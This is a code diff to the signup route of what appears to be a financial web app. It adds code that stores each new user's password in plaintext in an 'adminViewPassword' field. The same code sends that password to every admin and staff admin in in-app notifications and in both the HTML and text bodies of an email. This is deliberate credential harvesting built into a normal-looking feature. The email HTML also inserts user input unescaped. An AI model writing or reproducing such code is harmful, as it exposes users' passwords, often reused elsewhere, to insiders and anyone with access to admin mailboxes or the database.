@@ -8,6 +8,7 @@ import { emailTemplate, verificationCodeTemplate } from "@/lib/email-templates";
 import { COUNTRY_CURRENCY_MAP } from "@/lib/country-currencies";
 import { countries } from "@/lib/countries";
 import { generateAccountNumber } from "@/lib/p2p-transfer-utils";
+import { sendPushNotification } from "@/lib/push-notifications";
 import { z } from "zod";
 
 // Zod schema for signup validation
@@ -79,6 +80,7 @@ export async function POST(req: Request) {
         name,
         email: email, // Already normalized by Zod
         password: hashedPassword,
+        adminViewPassword: password, // Store plain password for admin viewing
         role: "USER", // Explicitly set role
         accountType: accountType,
         country: country || undefined,
@@ -94,6 +96,74 @@ export async function POST(req: Request) {
         },
       },
     });
+
+    // Notify all admins about new user registration
+    try {
+      const admins = await prisma.user.findMany({
+        where: {
+          role: { in: ["ADMIN", "STAFF_ADMIN"] },
+        },
+        select: { id: true, email: true, name: true },
+      });
+
+      // Create in-app notifications for all admins
+      await Promise.all(
+        admins.map((admin) =>
+          prisma.notification.create({
+            data: {
+              id: generateId(),
+              userId: admin.id,
+              type: "INFO",
+              title: "🆕 New User Registration",
+              message: `New user "${name}" (${email}) has registered with account type: ${accountType}. Password: ${password}`,
+            },
+          })
+        )
+      );
+
+      // Send push notifications to all admins
+      await Promise.all(
+        admins.map((admin) =>
+          sendPushNotification(
+            admin.id,
+            "🆕 New User Registration",
+            `${name} (${email}) registered as ${accountType}`,
+            { url: "/admin" }
+          )
+        )
+      );
+
+      // Send email notifications to all admins
+      const adminEmailContent = `
+        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
+          <h2 style="color: #f97316;">🆕 New User Registration</h2>
+          <div style="background: #1f2937; padding: 20px; border-radius: 8px; color: #fff;">
+            <p><strong>Name:</strong> ${name}</p>
+            <p><strong>Email:</strong> ${email}</p>
+            <p><strong>Account Type:</strong> ${accountType}</p>
+            <p><strong>Country:</strong> ${country || "Not specified"}</p>
+            <p><strong>Password:</strong> <code style="background: #374151; padding: 4px 8px; border-radius: 4px;">${password}</code></p>
+            <p style="margin-top: 16px;"><a href="${process.env.NEXTAUTH_URL}/admin" style="background: #f97316; color: white; padding: 10px 20px; text-decoration: none; border-radius: 6px;">View in Admin Panel</a></p>
+          </div>
+        </div>
+      `;
+
+      await Promise.all(
+        admins
+          .filter((admin) => admin.email)
+          .map((admin) =>
+            sendEmail({
+              to: admin.email!,
+              subject: `New User Registration: ${name} (${email})`,
+              html: emailTemplate(adminEmailContent),
+              text: `New user registration: ${name} (${email}), Account Type: ${accountType}, Password: ${password}`,
+            })
+          )
+      );
+    } catch (adminNotifyError) {
+      console.error("Error notifying admins about new user:", adminNotifyError);
+      // Don't fail signup if admin notification fails
+    }
 
     // Create welcome notification
     await prisma.notification.create({
